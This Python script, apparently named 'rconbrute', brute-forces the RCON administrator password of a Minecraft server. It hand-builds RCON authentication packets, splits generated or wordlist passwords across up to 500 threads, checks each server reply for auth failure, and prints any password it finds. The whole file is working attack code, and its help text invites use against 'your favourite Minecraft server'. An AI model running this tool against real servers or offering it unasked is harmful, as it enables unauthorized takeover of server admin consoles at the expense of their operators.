#!/usr/bin/env python
import argparse, itertools, socket, time, threading, math, random

name = """
   ██████  ▄▄▄     ▓██   ██▓     ▄████ ▓█████ ▒██   ██▒
 ▒██    ▒ ▒████▄    ▒██  ██▒    ██▒ ▀█▒▓█   ▀ ▒▒ █ █ ▒░
 ░ ▓██▄   ▒██  ▀█▄   ▒██ ██░   ▒██░▄▄▄░▒███   ░░  █   ░
   ▒   ██▒░██▄▄▄▄██  ░ ▐██▓░   ░▓█  ██▓▒▓█  ▄  ░ █ █ ▒ 
 ▒██████▒▒ ▓█   ▓██▒ ░ ██▒▓░   ░▒▓███▀▒░▒████▒▒██▒ ▒██▒
 ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░  ██▒▒▒     ░▒   ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░
 ░ ░▒  ░ ░  ▒   ▒▒ ░▓██ ░▒░      ░   ░  ░ ░  ░░░   ░▒ ░
 ░  ░  ░    ░   ▒   ▒ ▒ ░░     ░ ░   ░    ░    ░    ░  
       ░        ░  ░░ ░              ░    ░  ░ ░    ░  
                    ░ ░        REVISION 1                          
"""

class AtomicFlag:
    def __init__(self):
        self.value = False
        self._lock = threading.Lock()

    def get(self):
        with self._lock:
            return self.value

    def set(self):
        with self._lock:
            self.value = True

counter = 0
stopping = AtomicFlag()
found = None

def int_to_le(value):
	return value.to_bytes(4, 'little')

def make_payload(password, id):
	payload = int_to_le(id) #unique request ID
	payload += int_to_le(3) #packet ID for auth
	payload += password.encode('ascii') #password
	payload += b'\x00\x00' #two null bytes (one for the password, one for the packet)
	payload = int_to_le(len(payload)) + payload #add packet size-
	return payload

def bruteforce(host, port, _passwords, verbose, thr_n):
	global counter
	global stopping
	global found
	
	for pwd in _passwords:
		try:
			counter += 1
			if stopping.get():
				break
			
			id = random.randint(0, 59595995)
			payload = make_payload(pwd, id)
			
			con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			con.settimeout(1)
			con.connect((host, port))
			con.sendall(payload)
			
			if con.recv(1024)[4:8] != b'\xFF\xFF\xFF\xFF':
				found = pwd
				stopping.set()
				break
			
			con.close()
		except Exception as e:
			if verbose:
				print('[v] Thread {} reported an exception: {}'.format(thr_n, e))

def ___quit():
	stopping.set()
	try:
		for thr in threads_list:
			thr.join()
	except KeyboardInterrupt:
		pass
	raise SystemExit

if __name__ == '__main__':
	parser = argparse.ArgumentParser(
					prog='rconbrute',
					description='Bruteforce your favourite Minecraft server\'s RCON with this tool!',
					epilog='--list has priority over --charset with --length')
	parser.add_argument('-H', '--host', default='localhost',
		help='address of the RCON server (default is 0.0.0.0)')
	parser.add_argument('-p', '--port', default=25575, type=int,
		help='port of the RCON server (default is 25575)')
	parser.add_argument('-t', '--threads', default=5, type=int,
		help='number of bruteforcing threads (default is 5)')
	parser.add_argument('-c', '--charset', default='1234567890',
		help='charset to be used for generating passwords (default is 0-9)')
	parser.add_argument('-l', '--length', default=6, type=int,
		help='password length to be used for generating passwords (default is 6)')
	parser.add_argument('-L', '--list', type=argparse.FileType('r'),
		help='file containing passwords to be used')
	parser.add_argument('-v', '--verbose', action='store_true', help='do more output')
	
	parsed = vars(parser.parse_args())
	
	host = parsed['host']
	port = parsed['port']
	threads = parsed['threads']
	charset = parsed['charset']
	password_len = parsed['length']
	passwords = parsed['list']
	verbose = parsed['verbose']
	
	print(name)
	
	print('[*] Will be attacking {}:{}'.format(host, port))
	
	if threads <= 0 or threads > 500:
		print('[-] Please specify a reasonable amount of threads.')
		raise SystemExit
	
	if password_len <= 0 or password_len > 100:
		print('[-] Please specify a reasonable password length.')
		raise SystemExit
	
	use_file = passwords != None
	pwd_list = []
	pwds = None
	
	if use_file:
		pwd_list = [line.rstrip() for line in passwords]
		passwords.close()
		pwds = len(pwd_list)
	else:
		pwds = len(charset) ** password_len
	
	if use_file:
		if verbose:
			print('[v] Using ' + passwords.name + ' as a password list')
		
		if len(pwd_list) == 0:
			raise AssertionError('[-] Password list empty!')
			
		print('[*] Read {} passwords'.format(pwds))
	elif verbose:
		print('[v] Using ' + charset + ' as a charset')
	
	if not use_file:
		print('[*] Will use {} {}-character passwords'.format(pwds, password_len))
		pwd_list = [''.join(pwd) for pwd in itertools.product(charset, repeat = password_len)]
	
	print('[*] Checking if the RCON server is alive...')
	try:
		con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		con.settimeout(1)
		con.connect((host, port))
		con.close()
	except Exception:
		prompt = input('[-] The server appears to be DEAD. Continue anyway? (y/N)> ')
		if prompt == '' or 'y' not in prompt.lower():
			raise SystemExit
	else:
		print('[+] Server is alive.')
	
	last_verbose = time.time()
	threads_list = []
	
	# this divides all passwords (somewhat) equally between threads
	total_pwds_by_thread = math.floor(pwds / threads)
	for i in range(threads):
		sublist = None
		rem = pwds % threads
		
		if rem != 0 and i == 0:
			sublist = pwd_list[:total_pwds_by_thread + rem]
			del pwd_list[:total_pwds_by_thread + rem]
		else:
			sublist = pwd_list[:total_pwds_by_thread]
			del pwd_list[:total_pwds_by_thread]
		
		threads_list.append(threading.Thread(target = bruteforce, args = (
			host, port, sublist[:], verbose, len(threads_list) + 1
		)))
	
	for thr in threads_list:
		thr.start()
	
	try:
		while not stopping.get():
			threads_list = [thr for thr in threads_list if thr.is_alive()]
			if len(threads_list) == 0:
				stopping.set()
		
			if verbose and time.time() - last_verbose >= 1:
				last_verbose = time.time()
				print('[v] Tested {} passwords ({}%)'.format(counter, round((counter / pwds) * 100)))
	except KeyboardInterrupt:
		print('[*] KeyboardInterrupt! Tested {} passwords ({}%).'.format(counter, round((counter / pwds) * 100)))
		___quit()
	
	if stopping.get():
		if found != None:
			print('[+] PASSWORD FOUND! > {} < Tested {} passwords.'.format(found, counter))
		else:
			print('[-] Password NOT FOUND! Tested {} passwords.'.format(counter))
		
		___quit()